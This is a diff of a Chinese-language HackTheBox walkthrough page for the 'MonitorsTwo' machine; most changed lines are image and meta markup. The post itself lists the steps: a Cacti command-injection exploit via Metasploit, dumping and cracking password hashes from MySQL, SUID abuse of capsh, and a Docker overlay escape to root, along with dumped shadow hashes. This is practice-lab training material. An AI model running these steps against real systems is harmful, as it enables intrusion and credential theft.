@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;MonitorsTwo 10.10.11.211   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.211Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-04-30 13:29 CST">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;MonitorsTwo 10.10.11.211                                                                                                              端口扫描22和80: 12345678910111">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MonitorsTwo - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/04/30/MonitorsTwo-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;MonitorsTwo 10.10.11.211   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.211Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-04-30 13:29 CST">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;MonitorsTwo 10.10.11.211                                                                                                              端口扫描22和80: 12345678910111">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043001.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043002.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043003.jpg">
@@ -128,7 +128,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -217,14 +217,28 @@
 <li><a href="https://app.hackthebox.com/machines/MonitorsTwo" target="_blank" rel="noopener">https://app.hackthebox.com/machines/MonitorsTwo</a></li>
 <li>10.10.11.211</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043001.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043001.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.211</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 13:29 CST</span><br><span class="line">Nmap scan report for 10.10.11.211</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)</span><br><span class="line">|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)</span><br><span class="line">|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Login to Cacti</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 46.55 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>cacti 1.2.22:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043002.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043002.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="cacti"><a href="#cacti" class="headerlink" title="cacti"></a>cacti</h1><p>搜到这个：</p>
 <ul>
 <li>Cacti: Unauthenticated Remote Code Execution | Sonar<br><a href="https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/" target="_blank" rel="noopener">https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/</a></li>
@@ -234,15 +248,43 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/linux/http/cacti_unauthenticated_cmd_injection</span><br></pre></td></tr></table></figure>
 
 <p>打到容器的www-data:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043003.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043003.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="entrypoint-sh"><a href="#entrypoint-sh" class="headerlink" title="/entrypoint.sh"></a>/entrypoint.sh</h2><p>根目录发现entrypoint.sh，查看内容得到mysql：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043004.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043004.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>mysql中获取到两个hash,破解出来marcus的密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql --host=db --user=root --password=root cacti -e "show tables"</span><br><span class="line">mysql --host=db --user=root --password=root cacti -e "select * from user_auth"</span><br><span class="line"></span><br><span class="line">admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC</span><br><span class="line">marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C</span><br><span class="line"></span><br><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">marcus : funkymonkey</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043006.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043006.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>marcus ssh登录，得到user flag：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043005.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043005.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>另外登录时提示有邮件，查看邮件里面提到三个漏洞：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /var/mail/marcus</span><br><span class="line"></span><br><span class="line">CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.</span><br><span class="line"></span><br><span class="line">CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.</span><br><span class="line"></span><br><span class="line">CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.</span><br></pre></td></tr></table></figure>
 
@@ -252,7 +294,14 @@
 </ul>
 <p>根据描述就是外部宿主机调用docker内suid程序</p>
 <h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>回到容器的www-data,检查suid发现/sbin/capsh：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043007.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043007.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="docker-root"><a href="#docker-root" class="headerlink" title="docker root"></a>docker root</h2><p>利用capsh的suid得到容器的root：</p>
 <ul>
 <li>capsh | GTFOBins<br><a href="https://gtfobins.github.io/gtfobins/capsh/#suid" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/capsh/#suid</a></li>
@@ -260,12 +309,33 @@
 <p>然后给容器内的bash添加suid</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/sbin/capsh --gid=0 --uid=0 --</span><br><span class="line">chmod +s /bin/bash</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043008.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043008.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>再回到marcus ,查看挂载得到对应目录，然后直接运行docker内的suid bash得到root：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">marcus@monitorstwo:~$ findmnt</span><br><span class="line"></span><br><span class="line">/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/</span><br><span class="line"></span><br><span class="line">/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/bin/bash -p</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043010.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043009.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043010.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023043009.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$KQUOT7rGEpEUTjFc$hA2mxdKhpH7RQ3g5ZGjzkPrRpq1jCqmiZY9SgqaoTb1BI6APMo14Ed&#x2F;Ptbfnf5MAkCbBbHEbRqwzPc301fuat1:19366:0:99999:7:::</span><br><span class="line">marcus:$6$mobk0CS45kj4tF6o$bOq9Svoa9Q9AbmfIz2K210JOwv1wS3AFhaCsYkewZleSwBysUj&#x2F;a57p0YhRvi40A6cfkDFHfnuOP3useo.ms&#x2F;1:19366:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
